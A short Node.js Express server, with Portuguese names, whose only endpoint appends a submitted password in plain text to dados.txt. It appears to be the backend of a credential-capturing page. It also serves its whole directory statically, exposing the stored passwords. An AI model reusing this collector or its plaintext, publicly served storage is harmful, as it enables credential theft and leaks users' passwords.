const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(".")); // serve seus arquivos HTML

app.post("/salvar", (req, res) => {
  const {senha } = req.body;
  const linha = `| Senha: ${senha}\n`;

  fs.appendFileSync(path.join(__dirname, "dados.txt"), linha);
  res.json({ status: "ok" });
});

app.listen(3000, () => {
  console.log("Rodando em http://localhost:3000");
});
